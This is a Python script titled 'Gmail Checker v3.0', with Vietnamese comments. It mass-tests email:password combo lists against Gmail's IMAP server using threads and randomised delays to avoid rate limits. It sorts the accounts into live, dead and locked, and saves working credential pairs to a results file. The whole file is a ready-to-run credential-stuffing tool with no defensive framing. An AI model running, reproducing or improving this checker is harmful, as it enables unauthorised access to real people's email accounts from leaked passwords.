import imaplib
import threading
import time
import random
import os
import sys
import ssl
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════
#  Gmail Checker v3.0 - IMAP Method
# ═══════════════════════════════════════════

MAX_THREADS = 5     # Giữ thấp để tránh rate limit
TIMEOUT = 15
DELAY_MIN = 1
DELAY_MAX = 3

IMAP_HOST = "imap.gmail.com"
IMAP_PORT = 993

# Lock cho file output
file_lock = threading.Lock()

# Counters
stats = {"live": 0, "dead": 0, "locked": 0, "error": 0, "total": 0}


class Color:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    END = "\033[0m"


def banner():
    print(f"""
{Color.CYAN}{Color.BOLD}
 ██████╗ ███╗   ███╗ █████╗ ██╗██╗     
██╔════╝ ████╗ ████║██╔══██╗██║██║     
██║  ███╗██╔████╔██║███████║██║██║     
██║   ██║██║╚██╔╝██║██╔══██║██║██║     
╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
  Gmail Checker v3.0 - IMAP Login
{Color.END}{Color.GRAY}{'='*45}{Color.END}
""")


def load_accounts(filepath):
    accounts = []
    if not os.path.exists(filepath):
        print(f"{Color.RED}[!] File not found: {filepath}{Color.END}")
        return accounts
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            # Hỗ trợ: email|pass hoặc email:pass
            sep = "|" if "|" in line else ":"
            parts = line.split(sep, 1)
            if len(parts) == 2:
                accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts


def check_account_imap(email, password):
    """
    Check Gmail login qua IMAP (imap.gmail.com:993).
    """
    try:
        # Tạo SSL context
        ctx = ssl.create_default_context()
        
        # Connect tới IMAP server
        mail = imaplib.IMAP4_SSL(IMAP_HOST, IMAP_PORT, ssl_context=ctx, timeout=TIMEOUT)
        
        try:
            # Thử login
            mail.login(email, password)
            mail.logout()
            return "LIVE", "Login successful!"
        except imaplib.IMAP4.error as e:
            err_msg = str(e).lower()
            
            if "invalid credentials" in err_msg or "invalidcredentials" in err_msg:
                return "DEAD", "Invalid credentials"
            elif "web login required" in err_msg or "webalert" in err_msg:
                return "LOCKED", "Web login required (security check)"
            elif "application-specific password" in err_msg or "app password" in err_msg:
                return "LOCKED", "Needs App Password (2FA enabled)"  
            elif "too many" in err_msg or "limit" in err_msg:
                return "ERROR", "Rate limited - try later"
            elif "imap" in err_msg and "disabled" in err_msg:
                return "LOCKED", "IMAP is disabled for this account"
            else:
                return "DEAD", f"Auth failed: {str(e)[:80]}"
        finally:
            try:
                mail.shutdown()
            except:
                pass
                
    except socket.timeout:
        return "ERROR", "Connection timeout"
    except ConnectionRefusedError:
        return "ERROR", "Connection refused"
    except ssl.SSLError as e:
        return "ERROR", f"SSL error: {str(e)[:60]}"
    except OSError as e:
        return "ERROR", f"Network error: {str(e)[:60]}"
    except Exception as e:
        return "ERROR", f"Error: {str(e)[:80]}"


def save_result(filename, line):
    with file_lock:
        with open(filename, "a") as f:
            f.write(line + "\n")


def worker(account, index):
    email, password = account
    
    status, message = check_account_imap(email, password)

    color_map = {
        "LIVE": Color.GREEN,
        "DEAD": Color.RED,
        "LOCKED": Color.YELLOW,
        "ERROR": Color.GRAY,
    }
    color = color_map.get(status, Color.GRAY)
    combo = f"{email}:{password}"
    
    idx = index + 1
    total = stats["total"]
    print(f"  [{idx:>3}/{total}] {color}[{status:^7}]{Color.END} {email} → {message}")

    # Save
    status_lower = status.lower()
    save_result(f"results_{status_lower}.txt", combo)
    stats[status_lower] = stats.get(status_lower, 0) + 1

    # Random delay
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
    return status


def main():
    banner()

    # Select mode
    print(f"{Color.CYAN}[1]{Color.END} Mass check from file")
    print(f"{Color.CYAN}[2]{Color.END} Check single account")
    choice = input(f"\n{Color.YELLOW}Select mode (1/2): {Color.END}").strip()

    accounts = []

    if choice == "1":
        filepath = input(f"{Color.YELLOW}Enter file path (default: accounts.txt): {Color.END}").strip()
        if not filepath:
            filepath = "accounts.txt"
        accounts = load_accounts(filepath)
        if not accounts:
            print(f"{Color.RED}[!] No accounts loaded{Color.END}")
            return
        print(f"{Color.GREEN}[+] Loaded {len(accounts)} accounts{Color.END}")
    elif choice == "2":
        combo = input(f"{Color.YELLOW}Enter email|password: {Color.END}").strip()
        sep = "|" if "|" in combo else ":"
        parts = combo.split(sep, 1)
        if len(parts) != 2:
            print(f"{Color.RED}[!] Invalid format. Use email|password{Color.END}")
            return
        accounts = [(parts[0].strip(), parts[1].strip())]
    else:
        print(f"{Color.RED}[!] Invalid choice{Color.END}")
        return

    # Clean old result files
    for f in ["results_live.txt", "results_dead.txt", "results_locked.txt", "results_error.txt"]:
        if os.path.exists(f):
            os.remove(f)

    stats["total"] = len(accounts)
    
    threads = min(MAX_THREADS, len(accounts))
    print(f"\n{Color.CYAN}[*] Starting with {threads} threads (IMAP method)...{Color.END}")
    print(f"{Color.GRAY}    Target: {IMAP_HOST}:{IMAP_PORT}{Color.END}\n")
    
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(worker, acc, i): acc
            for i, acc in enumerate(accounts)
        }
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"{Color.RED}[!] Thread error: {e}{Color.END}")

    # Summary
    elapsed = time.time() - start_time
    print(f"\n{Color.GRAY}{'='*45}{Color.END}")
    print(f"{Color.BOLD}{Color.CYAN}  RESULTS SUMMARY{Color.END}")
    print(f"{Color.GRAY}{'='*45}{Color.END}")
    print(f"  {Color.GREEN}✓ Live:   {stats['live']}{Color.END}")
    print(f"  {Color.RED}✗ Dead:   {stats['dead']}{Color.END}")
    print(f"  {Color.YELLOW}⚠ Locked: {stats['locked']}{Color.END}")
    print(f"  {Color.GRAY}✦ Error:  {stats['error']}{Color.END}")
    print(f"  {Color.CYAN}⏱ Time:   {elapsed:.1f}s{Color.END}")
    print(f"{Color.GRAY}{'='*45}{Color.END}")
    print(f"\n{Color.GREEN}[+] Results saved to results_*.txt{Color.END}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}[!] Interrupted by user{Color.END}")
        sys.exit(0)
